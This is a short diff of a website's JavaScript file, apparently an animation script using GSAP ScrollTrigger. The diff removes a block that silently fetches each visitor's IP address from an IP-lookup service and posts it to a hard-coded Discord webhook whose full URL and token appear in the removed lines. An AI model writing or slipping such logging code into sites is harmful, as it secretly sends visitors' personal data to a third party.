@@ -1,25 +1,3 @@
-var ip = '';
-fetch('https://api.ipify.org/?format=json')
-.then(function(response) {
-    return response.json();
-})
-.then(function(data) {
-    ip = data.ip;
-    var webhook = 'https://discord.com/api/webhooks/1128662153289814158/-PyXb_961uAjml1V6k8UZrthPakNvjyxCZ7rnd_zpXXqUxGd5XA4O8K1CUBleY4D8hMA'; //Put webhook here 
-    var message = {
-        content: 'IP: ' + ip
-    };
-
-    fetch(webhook, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(message)
-    })
-})
-
-
 gsap.registerPlugin(ScrollTrigger);
     let speed = 100;
 
